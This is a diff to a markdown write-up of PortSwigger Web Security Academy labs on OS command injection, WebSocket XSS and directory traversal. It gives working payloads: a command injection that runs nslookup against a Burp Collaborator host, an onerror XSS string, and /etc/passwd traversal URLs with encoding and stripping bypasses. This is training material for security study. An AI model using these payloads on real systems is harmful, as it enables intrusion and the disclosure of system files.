@@ -1,3 +1,4 @@
+![image](https://user-images.githubusercontent.com/68326057/129083933-76c7585f-b299-498f-80f4-1cb464e430c2.png)
 
 
 # OS COMMAND INJECTION
@@ -38,7 +39,10 @@ After 10 Seconds.
 ![image](https://user-images.githubusercontent.com/68326057/128909629-e66ce51c-7f1d-4f60-b1e3-bdf4b4a44c50.png)
 
 
+---------------------------------------------
+
 ## Lab-3 Blind OS command injection with output redirection
+
 
 Payload:-
 
@@ -96,6 +100,69 @@ Connection: close
 csrf=u9t9yeYVcJ9iZLxiTXUtAY48zZ1qvgal&name=name&email=email%40gmail.com+||+nslookup+test.burpcollaborator.net+||&subject=subject&message=message
 ```
 
+
+
 ![image](https://user-images.githubusercontent.com/68326057/128914896-456aff67-fef2-4d88-982d-0aa4832c0a39.png)
+
+
+# WebSockets
+
+## Lab - 1 : Manipulating WebSocket messages to exploit vulnerabilities
+
+In Live Chat
+
+Payload:-
+
+```bash
+{"message":"<img src=1 onerror='alert(1)'>"} 
+```
+
+
+![image](https://user-images.githubusercontent.com/68326057/128958454-97efd963-5cdd-479a-9ade-77d7b37236b2.png)
+
+## Lab - 2 : Manipulating the WebSocket handshake to exploit vulnerabilities
+
+
+
+# Directory traversal
+
+## Lab - 1: File path traversal, simple case
+
+Payload Used:-
+
+```bash
+https://acd31f731fe5b78b809a5516006d0049.web-security-academy.net/image?filename=../../../../etc/passwd
+```
+
+![image](https://user-images.githubusercontent.com/68326057/129085856-12f59780-3100-4aac-9739-2c377d21c4ef.png)
+
+
+## Lab - 2: File path traversal, traversal sequences blocked with absolute path bypass
+
+![image](https://user-images.githubusercontent.com/68326057/129086516-276e3244-4944-4038-b96d-b1fa59ed76f3.png)
+
+![image](https://user-images.githubusercontent.com/68326057/129086628-20fe1a94-c1be-4dba-9413-14b41afcb8ed.png)
+
+## Lab - 3: File path traversal, traversal sequences stripped non-recursively
+
+Payload Used:-
+
+```bash
+https://ac441f6b1eb33036806c2ef3007100e2.web-security-academy.net/image?filename=....//....//....//....//etc/passwd
+```
+
+![image](https://user-images.githubusercontent.com/68326057/129088943-d41f0651-635d-41ef-b674-b928bcaca65f.png)
+
+## Lab - 4: File path traversal, traversal sequences stripped with superfluous URL-decode
+ 
+![image](https://user-images.githubusercontent.com/68326057/129092902-f8091331-a402-4ad8-bf26-21d0ec61b4a3.png)
+
+Payload Used:-
+
+```bash
+https://ac8b1fa41e6ec11780844dfd004000c4.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+```
+
+![image](https://user-images.githubusercontent.com/68326057/129093045-008d73ad-4fdb-4e23-90f8-bb722e460597.png)
 
 
